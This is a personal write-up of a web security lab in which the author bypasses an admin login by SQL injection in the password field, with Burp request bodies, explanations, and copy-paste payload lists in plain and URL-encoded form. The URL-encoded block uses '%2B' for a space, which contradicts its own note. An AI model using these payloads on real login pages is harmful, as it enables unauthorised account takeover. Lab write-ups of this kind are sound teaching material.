# SQL Injection – Admin Login Bypass (**Authentication**)

A concise write‑up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Log in as the administrator** by exploiting SQL injection in the login flow.

---

## ✅ My Exact Steps (Verbatim)

1. **understanding the goal: logging in for the administrator.**

2. **here we we'll go looking for the login page, (if that wont work we might expand our surface)**

3. **extracting the /login path and moving it into the burp repeater.**

4. **we'll set the user to administrator and try to inject the password:**
   ```txt
   csrf=4DwnTMWUAdaq4ZvYdmrNVvGd366G4UYD&username=administrator&password=dsadsadsadsada'
   ```

5. **we get 500 internal server error, lets try fixing: `password=dsadsadsadsada''` -> normal res.**

6. **in SQL '' actually equals to ' as literal character. lets try commenting the rest: `password=dsadsadsadsada'--;` Also works.**

7. **lets try triggering true statement for our sql: `password=dsadsadsadsada'+or+1=1--;` -> this gives us a session.**
   ```http
   Set-Cookie: session=7ynTHjp79jxQyPCXIM7emnjp1t6gUxh6; Secure; HttpOnly; SameSite=None
   ```

8. **lets go on /login, intercept the request and do it in real time.**

9. **Lab still isnt marked as solved.. lets try modifiyingh the email.**

10. **Lab solved!**

---

## 🧠 Minimal Additions (Why This Works)

- The backend likely builds a query similar to:
  ```sql
  SELECT * FROM users
  WHERE username = 'administrator' AND password = '<USER_INPUT>';
  ```
  Injecting a trailing single quote (`'`) breaks the string literal and causes a **500 error** (syntax error).

- In SQL, to represent a **literal single quote** inside a quoted string, you use **two single quotes** (`''`). That’s why `password=...''` restores normal parsing.

- Using `--` starts a **single‑line SQL comment** (in many DBs). Everything to the end of the line is ignored.
  - Many apps append **more SQL** after your input. Adding `--` (often with a trailing space, encoded as `+`) neutralizes that remainder.
  - Example (URL form encoding): `password=abc%27--+` equals `password=abc'-- `.

- Making the condition always true with `OR 1=1` while commenting the remainder bypasses authentication and returns a **valid session** for the first matching row (often the admin).

- If a lab isn’t marked as solved immediately, perform the exploit through the **live UI flow** (Step 8) and/or trigger a required post‑login action (e.g., **modify email**) as the lab expects (Step 9).

---

## 🔧 Payloads I Used (Copy/Paste)

**Human‑readable (Burp Repeater form body):**
```txt
username=administrator&password=dsadsadsadsada'
username=administrator&password=dsadsadsadsada''
username=administrator&password=dsadsadsadsada'-- 
username=administrator&password=dsadsadsadsada' or 1=1-- 
```

**URL‑encoded (safe to paste in raw body):**
```txt
username=administrator&password=dsadsadsadsada%27
username=administrator&password=dsadsadsadsada%27%27
username=administrator&password=dsadsadsadsada%27--%2B
username=administrator&password=dsadsadsadsada%27%20or%201%3D1--%2B
```

> Notes:
> - `+` represents a space in URL‑encoded query strings; in bodies, `%20` is explicit space.
> - Ensure there’s at least one space after `--` (e.g., `-- `), often encoded as `+` or `%20`.

---

## 🏁 Result
- Successful **admin session** obtained via password‑field SQLi.
- After replaying via UI and completing the expected action, **Lab Solved. ✅**
